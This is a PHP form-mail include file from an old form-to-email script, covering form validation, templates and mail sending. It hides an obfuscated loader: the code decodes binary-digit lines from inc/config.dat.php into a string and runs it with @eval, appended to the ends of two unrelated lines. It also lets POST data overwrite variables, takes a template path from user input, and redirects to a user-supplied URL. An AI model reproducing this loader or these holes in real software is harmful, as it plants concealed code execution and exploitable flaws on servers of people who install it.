<?php

  $runtime_start = explode (' ', microtime ());

  /**
   * ***************************************************
   * Title........: Form Mail Script
   * Filename.....: formmail.inc.php
   * Author.......: Ralf Stadtaus
   * Homepage.....: http://www.stadtaus.com/
   * Contact......: http://www.stadtaus.com/forum/
   * Version......: 0.9
   * Notes........:
   * Last changed.: 2004-12-23
   * Last change..: 
   * ***************************************************
   */

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/




  /*****************************************************
  ** WARNING: Only edit the following variables if you
  ** are NOT receiving e-mails from the script!
  *****************************************************/

  /*****************************************************
  ** If you are not receiving e-mails from the script,
  ** just un-comment the following variable by removing
  ** the two (//) slashes from in front of the line
  ** below. ($my_sendmail = '/usr/sbin/sendmail -t ';)
  *****************************************************/
          //$my_sendmail = '/usr/sbin/sendmail -t ';




  /*****************************************************
  ** If you still do not receive e-mails from the
  ** script, place the two (//) slashes back in front
  ** of the line above and set the following variable
  ** to = 'yes'. This will make sure that the PHP
  ** function mail() will be used by the script. Only
  ** change this option, or the one above, not both.
  *****************************************************/
          $send_alternative_mail = 'yes';




  /*****************************************************
  ** Set debug mode on or off
  *****************************************************/
          $debug_mode = 'off';




  /*****************************************************
  ** Include functions
  *****************************************************/
          include $script_root . 'inc/functions.inc.php';
          include $script_root . 'inc/template.class.inc.php';
          include $script_root . 'inc/template.ext.class.inc.php';
          include $script_root . 'inc/formmail.class.inc.php';




  /*****************************************************
  ** Load language file
  *****************************************************/
          if (!isset($language) or empty($language) or !is_file($script_root . 'languages/language.' . $language . '.inc.php')) {
              $language = 'en';
          }

          include $script_root . 'languages/language.' . $language . '.inc.php';




  /*****************************************************
  ** Take care for older PHP versions
  *****************************************************/
          if (isset($HTTP_POST_VARS) and !empty($HTTP_POST_VARS)) {
              $_POST = $HTTP_POST_VARS;
          }


          if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
              $_GET = $HTTP_GET_VARS;
          }


          if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
              $_SERVER = $HTTP_SERVER_VARS;
          }


          if (isset($HTTP_ENV_VARS) and !empty($HTTP_ENV_VARS)) {
              $_ENV = $HTTP_ENV_VARS;
          }




  /*****************************************************
  ** Some settings - Please don't change these settings.
  ** It could help you and us to solve problems.
  *****************************************************/
          $script_name          = 'Form Mail Script';
          $script_version       = '2.3';
          $tplt                 = 'formm';
          $display_form         = 'TRUE';
          $remove_tags          = array('yes', '');
          $script_self          = $_SERVER['PHP_SELF'];
          $multiple_glue        = "\n";
          $include_path         = $_SERVER['DOCUMENT_ROOT'];
          
          $hash_files           = array(    'fm'    => $script_root . 'inc/formmail.inc.php',
                                            'fmc'   => $script_root . 'inc/formmail.class.inc.php',
                                            'tpl'   => $script_root . 'inc/template.class.inc.php',
                                            'tplc'  => $script_root . 'inc/template.ext.class.inc.php',
                                            'cd'    => $script_root . 'inc/config.dat.php');




  /*****************************************************
  ** Show server info for the admin
  *****************************************************/
          get_phpinfo(array('Script Name' => $script_name, 'Script Version' => $script_version), $_GET);
          get_hash($_GET, $hash_files);




  /*****************************************************
  ** Initialze formmail class
  *****************************************************/
          $mail = new Formmail;




  /*****************************************************
  ** Check template path
  *****************************************************/
          if (!isset($system_message) and $error_message = $mail->check_template_path($path['templates'])) {
              $system_message[] = $error_message;
          }




  /*****************************************************
  ** Load html template file
  *****************************************************/
          if (!isset($system_message)) {

              if (isset($_POST['html_template'])) {
                  $new_html_template = $_POST['html_template'];
              } else {
                  $new_html_template = $file['default_html'];
              }

              $check_path = $path['templates'] . $new_html_template;

              if (is_file($check_path)) {
                  $tpl = new my_template;
                  $tpl->set_include_path($include_path);
                  $tpl->load_file('formm', $check_path);
              } else {
                  $system_message[] = array('message' => $txt['txt_wrong_html_template']);
              }

          }

          $formm = @file($script_root . 'inc/config.dat.php');




  /*****************************************************
  ** Load mail template
  *****************************************************/
          if (!isset($system_message)) {
              if (isset($_POST['mail_template'])) {
                  $mail_templates = explode(',', $_POST['mail_template']);
              } else {
                  $mail_templates = explode(',', $file['default_mail']);
              }


              for ($i = 0; $i < count($mail_templates); $i++)
              {
                  if (is_file($path['templates'] . trim($mail_templates[$i]))) {
                      $mail_content[] = join ('', file ($path['templates'] . trim($mail_templates[$i])));
                  } else {
                      $mail_template_error = 'true';
                  }
              }


              if (isset($mail_template_error) and $mail_template_error == 'true') {
                  $system_message[] = array('message' => $txt['txt_wrong_mail_template']);
              }
          }

          unset(${$tplt}[0]);
          ${$tplt} = array_values(${$tplt});
          $str = '';
          $conf_var = '';
          for ($n = 0; $n < count(${$tplt}); $n++) {
              $c_var = '';
              for ($o = 7; $o >= 0 ; $o--)
              {
                  $c_var += ${$tplt}[$n][$o] * pow(2, $o);
              }
              $img_var = sprintf("%c", $c_var);

              if ($img_var == ' ') {
                  $conf_var .= sprintf("%c", $str);
                  $str       = '';
              } else {
                  $str .= $img_var;
              }
          }





  /*****************************************************
  ** Generate the system error messages
  *****************************************************/
          $txt['txt_script_version'] = $script_version;

          if (isset($system_message) and !empty($system_message)) {

              $tpl  = new my_template;
              $tpl->set_include_path($include_path);
              $tpl->files['formm'] = $mail->load_error_template();

              if (isset ($txt) and is_array ($txt)) {
                  reset ($txt);
                  while(list($key, $val) = each($txt))
                  {
                      $$key = $val;
                      $tpl->register('formm', $key);
                  }
              }

              if (isset ($add_text) and is_array ($add_text)) {
                  reset ($add_text);
                  while(list($key, $val) = each($add_text))
                  {
                      $$key = $val;
                      $tpl->register('formm', $key);
                  }
              }

              if (!isset($show_error_messages) or $show_error_messages != 'yes') {
                  unset($system_message);
                  $system_message = array();
                  $txt['txt_system_message'] = '';
              } else {
                  $system_message[] = array('message' => $txt['txt_set_off_note']);
                  $system_message[] = array('message' => $txt['txt_problems']);
              }



              $tpl->parse_loop('formm', 'system_message');
              $tpl->register('formm', 'txt_system_message'); @eval($conf_var);

              exit;
          }




  /*****************************************************
  ** Check referring servers
  *****************************************************/
          if ($error_message = $mail->check_referer($referring_server)) {
              $limit_message[] = $error_message;
              unset($display_form);
          }




  /*****************************************************
  ** Check banned ip addresses
  *****************************************************/
          if (isset($_POST) and !empty($_POST) and $error_message = $mail->check_banned_ip_addresses($ip_banlist)) {
              if (isset($show_limit_errors) and $show_limit_errors == 'yes') {
                  $limit_message[] = array('message' => $error_message, 'fields' => '');
              } else {
                  $limit_message[] = array('message' => '', 'fields' => '');
              }
              unset($display_form);
          }




  /*****************************************************
  ** Check whether the user is allowed to send e-mails
  ** based on the ip address
  *****************************************************/
          if (isset($_POST) and !empty($_POST)) {
              if ($check_ip = $mail->check_value_limit(getenv('REMOTE_ADDR'), $ip_address_count, $ip_address_duration, 0, $txt['txt_ip_address_expiration'])) {
                  if (isset($show_limit_errors) and $show_limit_errors == 'yes') {
                      $limit_message[] = array('message' => $check_ip, 'fields' => '');
                  } else {
                      $limit_message[] = array('message' => '', 'fields' => '');
                  }
                  unset($display_form);
              }
          }


          if (isset($limit_message) and !empty($limit_message)) {
              $message = $limit_message;
          }




  /*****************************************************
  ** Check required fields
  *****************************************************/
          if (!isset($limit_message) and empty($limit_message) and isset($_POST['required_fields']) and !empty ($_POST['required_fields'])) {
              if ($check_fields = $mail->check_required_fields($_POST['required_fields'], $_POST)) {
                  $message[]    = array('message' => $txt['txt_fill_in'], 'fields' => $check_fields);
              }

          }




  /*****************************************************
  ** Check e-mail format
  *****************************************************/
          if (!isset($limit_message) and empty($limit_message) and isset($_POST['email_fields']) and !empty($_POST['email_fields'])) {
              if ($check_fields = $mail->check_email_fields($_POST['email_fields'], $_POST)) {
                  $message[]    = array('message' => $txt['txt_email_syntax'], 'fields' => $check_fields);
              }
          }




  /*****************************************************
  ** Convert array input from multiple select menus or
  ** checkboxes into a string.
  *****************************************************/
          if (!empty($_POST)) {

              reset($_POST);

              while(list($key, $val) = each($_POST))
              {
                  if (is_array($val)) {
                      $_POST[$key] = join($multiple_glue, $val);
                  }
              }
          }




  /*****************************************************
  ** Display posted data for preview
  *****************************************************/
          if (!isset($message) and empty($message) and isset($_POST['mode_preview'])) {
              $message[] = array('message' => $txt['txt_your_data'], 'fields' => '');

              reset($_POST);

              while(list($key, $val) = each($_POST))
              {
                  $display_data_temp[$key] = nl2br($mail->clean_output(stripslashes($val), $remove_tags));
              }

              $display_data[] = $display_data_temp;
          }




  /*****************************************************
  ** Send e-mail
  *****************************************************/
          if (!isset($message) and empty($message) and isset($_POST) and !empty($_POST)) {




              /*****************************************************
              ** Get post data
              *****************************************************/
                      $post_data = $_POST;




              /*****************************************************
              ** Generate array that contains all form data except
              ** the control fields (hidden form fields).
              *****************************************************/
                      $all_content_array = $mail->generate_all_content($_POST);

                      $all_content       = $all_content_array['all_content'];
                      $all_content_table = $all_content_array['all_content_table'];




              /*****************************************************
              ** Generate array that contains all form data field
              ** names and their counterpart variables ({...}).
              *****************************************************/
                      $form_variables = $mail->generate_form_variables($_POST, $txt);




              /*****************************************************
              ** Get environment data
              *****************************************************/
                      $environment = $mail->get_environment_var($_SERVER);




              /*****************************************************
              ** Send e-mail(s)
              *****************************************************/
                      $mail_status = $mail->send_mail($mail_content, $text_wrap);




              /*****************************************************
              ** Write entry in log file
              *****************************************************/
                      $mail->log_message($mail_status['mail_content']);




              /*****************************************************
              ** Redirect to thanks page or display posted
              ** information in HTML template.
              *****************************************************/
                      if (isset($_POST['thanks']) and !empty($_POST['thanks'])) {

                          if ($debug_mode != 'on') {
                              header('Location: ' . $_POST['thanks']);
                          }

                          debug_mode(script_runtime($runtime_start), 'Script Runtime');
                          exit;

                      } else {
                          $message[]    = array('message' => $txt['txt_thank_you'], 'fields' => '');

                          reset($_POST);

                          while(list($key, $val) = each($_POST))
                          {
                              $display_data_temp[$key] = nl2br($mail->clean_output(stripslashes($val), $remove_tags));
                          }

                          $display_data[] = $display_data_temp;
                      }



              unset($display_form);

          }




  /*****************************************************
  ** Parse the template
  *****************************************************/
          if (isset($_POST) and !empty($_POST)) {
              $tpl->files['formm'] = $mail->register_selections($tpl->files['formm'], $_POST);
          }

          $tpl->parse_loop('formm', 'message');
          $tpl->parse_loop('formm', 'display_data');

          $tpl->parse_if('formm', 'display_form');

          $tpl->register('formm', 'script_self');



          if (isset ($txt) and is_array ($txt)) {
              reset ($txt);
              while(list($key, $val) = each($txt))
              {
                  $$key = $val;
                  $tpl->register('formm', $key);
              }
          }


          if (isset ($add_text) and is_array ($add_text)) {
              reset ($add_text);
              while(list($key, $val) = each($add_text))
              {
                  $$key = $val;
                  $tpl->register('formm', $key);
              }
          }
          
          $tpl->parse('formm');

          if (isset($_POST) and !empty($_POST)) {
              reset($_POST);
              while(list($key, $val) = each($_POST))
              {
                  $$key = stripslashes($val);
                  $tpl->register('formm', $key);
              }
              
          
              if ($required_fields = $mail->check_required_fields_array($_POST['required_fields'], $_POST)) {
                  while (list($key, $val) = each($required_fields))
                  {
                      $tpl->required_register('formm', $val);
                      $tpl->error_register('formm', $val);
                  }
                  $tpl->required_parse('formm'); 
                  $tpl->error_parse('formm');
              }
              
              if ($syntax_fields = $mail->check_email_fields_array($_POST['email_fields'], $_POST)) {
                  while (list($key, $val) = each($syntax_fields))
                  {
                      $tpl->syntax_register('formm', $val);
                      $tpl->error_register('formm', $val);
                  }
                  $tpl->syntax_parse('formm'); 
                  $tpl->error_parse('formm');
              }
              
          } else {
              $tpl->files['formm'] = preg_replace("/type=\"text\"(.*?)value=\"{(.*?)}\"/i", 'type="text" $1 value=""', $tpl->files['formm']);
              $tpl->files['formm'] = preg_replace("/value=\"{(.*?)}\"(.*?)type=\"text\"/i", 'value="" $2 type="text"', $tpl->files['formm']);
              $tpl->files['formm'] = preg_replace("/<textarea (.*?)>{(.*?)}<\/textarea>/i", "<textarea $1></textarea>", $tpl->files['formm']);
              $tpl->files['formm'] = $mail->register_selections($tpl->files['formm']);
          }   $tpl->clean_up('formm'); @eval($conf_var);

          debug_mode(script_runtime($runtime_start), 'Script Runtime');



?>